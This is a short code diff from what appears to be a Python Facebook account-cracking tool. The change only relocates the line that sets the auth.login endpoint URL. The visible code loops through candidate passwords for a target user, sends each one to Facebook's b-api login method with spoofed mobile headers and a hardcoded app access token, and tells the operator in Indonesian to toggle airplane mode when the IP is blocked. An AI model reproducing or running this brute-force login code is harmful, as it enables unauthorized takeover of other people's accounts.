@@ -319,7 +319,6 @@ class ngentod:
         for pw in zona:
             pw = pw.lower()
             ses = requests.Session()
-            bapi="https://b-api.facebook.com/method/auth.login"
             header = {"user-agent": ua,
             "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
             "x-fb-sim-hni": str(random.randint(20000,40000)),
@@ -328,6 +327,7 @@ class ngentod:
             "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
             "content-type": "application/x-www-form-urlencoded",
             "x-fb-http-engine": "Liger"}
+            bapi = "https://b-api.facebook.com/method/auth.login"
             response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
             if response.status_code != 200:
             	print ("\r\033[0;91m [!] IP terblokir. hidupkan mode pesawat 2 detik"),
